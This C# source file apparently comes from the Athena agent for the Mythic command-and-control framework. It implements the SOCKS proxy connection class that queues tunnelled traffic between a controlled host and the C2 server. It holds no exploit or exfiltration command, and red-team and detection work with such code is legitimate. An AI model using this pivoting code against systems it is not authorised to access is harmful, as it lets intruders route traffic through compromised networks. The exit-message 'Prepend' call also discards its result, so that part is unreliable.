using Athena.Models.Mythic.Response;
using Athena.Models.Socks;
using System.Collections.Concurrent;
using System.Net;

namespace Athena.Models.Athena.Socks
{
    public class AthenaSocksConnection
    {
        public int server_id { get; set; }
        //public SimpleTcpClient client;
        public AsyncTcpClient client;
        public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
        private ConcurrentBag<SocksMessage> messages = new ConcurrentBag<SocksMessage>();
        public bool exited;

        public AthenaSocksConnection(ConnectionOptions co) {
            this.client = new AsyncTcpClient(co)
            {
                ConnectedCallback = async (client, isReconnected) =>
                {
                    SocksMessage smOut = new SocksMessage(
                     this.server_id,
                     new ConnectResponse
                     {
                         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                         bndport = new byte[] { 0x00, 0x00 },
                         addrtype = (byte)AddressType.IPv4,
                         status = ConnectResponseStatus.Success,
                     }.ToByte(),
                     this.IsConnected() ? false : true
                    );
                    this.messages.Add(smOut);
                    this.onSocksEvent.Set();
                },
                ClosedCallback = async (client, closedByRemote) =>
                {
                    this.onSocksEvent.Set();
                    this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
                    this.exited = true;
                },
                ReceivedCallback = async(client, count) =>
                {
                    byte[] buf;
                    if(count > 0)
                    {
                        buf = this.client.ByteBuffer.Dequeue(count);
                        this.messages.Add(new SocksMessage(this.server_id, buf, this.IsConnected() ? false : true));
                    }
                }
            };
            this.server_id = co.server_id;
            this.exited = false;
        }

        public bool IsConnected()
        {
            return this.client.IsConnected;
        }

        public List<SocksMessage> GetMessages()
        {
            List<SocksMessage> msgs = new List<SocksMessage>(this.messages);
            this.messages.Clear();

            if (this.exited)
            {
                msgs.Prepend(new SocksMessage(this.server_id, new byte[] { }, true));
            }

            foreach (var msg in msgs)
            {
                msg.PrepareMessage();
            }
            return msgs;
        }
    }
}
